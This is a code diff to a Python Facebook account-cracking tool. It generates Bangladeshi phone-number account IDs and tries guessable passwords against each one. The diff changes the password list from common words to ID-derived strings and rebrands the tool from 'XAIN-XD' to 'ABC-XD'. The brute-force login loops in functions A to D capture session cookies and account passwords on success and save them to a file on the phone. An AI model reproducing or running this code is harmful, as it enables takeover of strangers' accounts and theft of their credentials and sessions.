@@ -3477,11 +3477,11 @@ def virusA():
 		print(' [+] COUNTRY    : Bangladesh')
 		print(' [+] TOTAL ID   :  '+tl)
 		print(f' [+] SIM CODE   : \033[1;92m {kode} ')
-		print(' [+] START BD UID MIXT CRACKING... ')
+		print(' [+] START CRACKING... ')
 		print(" \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234',kode+'12345','rafsan','arafat','FREE FIRE','mimmim','riaria','jannat','free fire','i love you']
+			pwx = ['57273200',uid[:6],uid[:8],uid]
 			if option=='1':
 				yaari.submit(A,uid,pwx,tl)
 			if option=='2':
@@ -3505,7 +3505,7 @@ def A(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mXAIN-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mABC-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen) 
             oo=random.choice(uas)
@@ -3552,10 +3552,10 @@ def A(uid,pwx,tl):
                 cid=coki.split("c_user=")[1][:15].replace(";","")
                 xz = requests.get(f"https://graph.facebook.com/"+cid+"/picture?type=normal").text
                 if "Photoshop" in xz:
-                    print(f'\r\33[1;92m [XAIN-XD-💚] '+cid+' | '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m [ABC-XD-💚] '+cid+' | '+ps+'\33[0;92m')
                     print(f'\r\033[1;94m=[🌺]=COOKIE : '+coki)
                     oks.append(uid)
-                    open('/sdcard/XAIN-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ABC-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
                     
                     break
             else:
@@ -3573,7 +3573,7 @@ def B(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mXAIN-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mABC-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen) 
             oo=random.choice(uas)
@@ -3620,10 +3620,10 @@ def B(uid,pwx,tl):
                 cid=coki.split("c_user=")[1][:15].replace(";","")
                 xz = requests.get(f"https://graph.facebook.com/"+cid+"/picture?type=normal").text
                 if "Photoshop" in xz:
-                    print(f'\r\33[1;92m [XAIN-XD-💚] '+cid+' | '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m [ABC-XD-💚] '+cid+' | '+ps+'\33[0;92m')
                     print(f'\r\033[1;94m=[🌺]=COOKIE : '+coki)
                     oks.append(uid)
-                    open('/sdcard/XAIN-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ABC-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
                     
                     break
             else:
@@ -3641,7 +3641,7 @@ def C(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mXAIN-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mABC-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen) 
             oo=random.choice(uas)
@@ -3688,10 +3688,10 @@ def C(uid,pwx,tl):
                 cid=coki.split("c_user=")[1][:15].replace(";","")
                 xz = requests.get(f"https://graph.facebook.com/"+cid+"/picture?type=normal").text
                 if "Photoshop" in xz:
-                    print(f'\r\33[1;92m [XAIN-XD-💚] '+cid+' | '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m [ABC-XD-💚] '+cid+' | '+ps+'\33[0;92m')
                     print(f'\r\033[1;94m=[🌺]=COOKIE : '+coki)
                     oks.append(uid)
-                    open('/sdcard/XAIN-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ABC-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
                     
                     break
             else:
@@ -3709,7 +3709,7 @@ def D(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mXAIN-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mABC-XD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen) 
             oo=random.choice(uas)
@@ -3756,10 +3756,10 @@ def D(uid,pwx,tl):
                 cid=coki.split("c_user=")[1][:15].replace(";","")
                 xz = requests.get(f"https://graph.facebook.com/"+cid+"/picture?type=normal").text
                 if "Photoshop" in xz:
-                    print(f'\r\33[1;92m [XAIN-XD-💚] '+cid+' | '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m [ABC-XD-💚] '+cid+' | '+ps+'\33[0;92m')
                     print(f'\r\033[1;94m=[🌺]=COOKIE : '+coki)
                     oks.append(uid)
-                    open('/sdcard/XAIN-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
+                    open('/sdcard/ABC-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
                     
                     break
             else:
